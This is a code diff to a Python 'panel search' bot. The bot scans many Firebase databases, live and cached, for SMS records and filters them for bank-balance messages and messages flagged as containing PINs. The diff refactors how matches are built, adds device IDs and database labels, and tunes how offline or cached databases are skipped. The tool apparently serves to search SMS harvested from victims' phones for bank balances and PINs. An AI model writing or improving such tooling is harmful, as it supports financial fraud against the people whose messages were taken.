@@ -22,6 +22,7 @@ from panel_search_bot.services import (
     wants_bank_filter,
     within_days,
 )
+from panel_search_bot.firebase_urls import device_id_from_raw_path, firebase_db_label
 from panel_search_bot.sms_parser import effective_message_at, is_bank_balance_sms, is_junk_sms
 
 
@@ -43,6 +44,8 @@ class SearchMatch:
     balance: float | None
     has_pin: bool
     source: str  # live | cache
+    device_id: str = ""
+    db_label: str = ""
 
 
 @dataclass
@@ -112,6 +115,44 @@ def _filter_row(
     return True
 
 
+def match_from_cache_row(url: str, row) -> SearchMatch:
+    from panel_search_bot.sms_parser import parse_balance
+
+    balance = row.balance_value if row.balance_value is not None else parse_balance(row.body)
+    msg_at = effective_message_at(row.message_at, row.body)
+    device = device_id_from_raw_path(row.raw_path or "")
+    if device == "unknown" and row.device_key and not row.device_key.startswith("http"):
+        device = row.device_key[:128]
+    return SearchMatch(
+        firebase_url=url,
+        db_label=firebase_db_label(url),
+        device_id=device,
+        sender=row.sender,
+        body=row.body,
+        message_at=msg_at,
+        balance=balance,
+        has_pin=row.has_pin,
+        source="cache",
+    )
+
+
+def match_from_live_item(url: str, item: dict) -> SearchMatch:
+    body = item.get("body", "")
+    return SearchMatch(
+        firebase_url=url,
+        db_label=firebase_db_label(url),
+        device_id=str(
+            item.get("device_id") or device_id_from_raw_path(str(item.get("raw_path", "")))
+        ),
+        sender=item.get("sender", ""),
+        body=body,
+        message_at=effective_message_at(item.get("message_at"), body),
+        balance=item.get("balance"),
+        has_pin=item.get("has_pin", False),
+        source="live",
+    )
+
+
 def format_result_file(matches: list[SearchMatch], params: SearchParams) -> str:
     lines = [
         "# Panel Search export",
@@ -154,7 +195,7 @@ def _finalize_search(
                 if has_data:
                     upsert_cached_sms(db, row.id, row.url_normalized, sms_list)
                 # dead / empty / wrong URL → offline (next scan skip)
-                update_firebase_status(db, row.id, has_data)
+                update_firebase_status(db, row.id, online or has_data)
                 for item in sms_list:
                     if _filter_row(
                         item.get("sender", ""),
@@ -164,19 +205,7 @@ def _finalize_search(
                         item.get("has_pin", False),
                         params,
                     ):
-                        matches.append(
-                            SearchMatch(
-                                firebase_url=url,
-                                sender=item.get("sender", ""),
-                                body=item.get("body", ""),
-                                message_at=effective_message_at(
-                                    item.get("message_at"), item.get("body", "")
-                                ),
-                                balance=item.get("balance"),
-                                has_pin=item.get("has_pin", False),
-                                source="live",
-                            )
-                        )
+                        matches.append(match_from_live_item(url, item))
 
             if params.mode == "online" and skipped_cached:
                 skip_ids = [url_to_row[u].id for u in skipped_cached if u in url_to_row]
@@ -186,17 +215,7 @@ def _finalize_search(
                     if _filter_row(
                         row.sender, row.body, row.message_at, row.balance_value, row.has_pin, params
                     ):
-                        matches.append(
-                            SearchMatch(
-                                firebase_url=url,
-                                sender=row.sender,
-                                body=row.body,
-                                message_at=effective_message_at(row.message_at, row.body),
-                                balance=row.balance_value,
-                                has_pin=row.has_pin,
-                                source="cache",
-                            )
-                        )
+                        matches.append(match_from_cache_row(url, row))
 
         if params.mode in ("offline", "both"):
             ids = [row.id for row in firebase_rows]
@@ -211,17 +230,7 @@ def _finalize_search(
                 fb = db.query(FirebaseDb).filter(FirebaseDb.id == row.firebase_db_id).first()
                 url = fb.url_normalized if fb else "unknown"
                 if _filter_row(row.sender, row.body, row.message_at, row.balance_value, row.has_pin, params):
-                    matches.append(
-                        SearchMatch(
-                            firebase_url=url,
-                            sender=row.sender,
-                            body=row.body,
-                            message_at=effective_message_at(row.message_at, row.body),
-                            balance=row.balance_value,
-                            has_pin=row.has_pin,
-                            source="cache",
-                        )
-                    )
+                    matches.append(match_from_cache_row(url, row))
 
         if params.mode == "both":
             seen: set[tuple] = set()
@@ -285,14 +294,18 @@ async def run_search(
         finally:
             session.close()
 
+    cached_ids = await asyncio.to_thread(_cached_ids)
+
     offline_ids = await asyncio.to_thread(_offline_ids)
-    if offline_ids:
-        skipped_offline = {u for u in urls if url_to_row[u].id in offline_ids}
+    if offline_ids and settings.panel_search_skip_offline_hours > 0:
+        # Skip live fetch only when we already have SMS cached for that DB (avoid 1s / 0-match VPS scans).
+        skipped_offline = {
+            u for u in urls if url_to_row[u].id in offline_ids and url_to_row[u].id in cached_ids
+        }
         fetch_urls = [u for u in fetch_urls if u not in skipped_offline]
 
     # Cached DBs hold most SMS; skipping live is OK for both/offline (cache pass runs below).
     # For online-only + day filter, still skip live on cache — dates are often missing in cache anyway.
-    cached_ids = await asyncio.to_thread(_cached_ids)
     has_cache = len(cached_ids) >= settings.panel_search_min_cached_dbs_for_fast_both
 
     if settings.panel_search_skip_live_if_cached and cached_ids:
@@ -335,6 +348,12 @@ async def run_search(
     if params.mode == "both" and settings.panel_search_both_skip_uncached_live and has_cache:
         fetch_urls = [u for u in urls if url_to_row[u].id not in cached_ids and u not in skipped_offline]
         skipped_n = len({u for u in urls if url_to_row[u].id in cached_ids})
+
+    if not fetch_urls and params.mode in ("online", "both"):
+        uncached = [u for u in urls if url_to_row[u].id not in cached_ids]
+        fetch_urls = uncached if uncached else list(urls)
+        skipped_offline = set()
+        base_skip = 0
 
     live: dict[str, tuple[bool, list[dict], str]] = {}
     if fetch_urls:
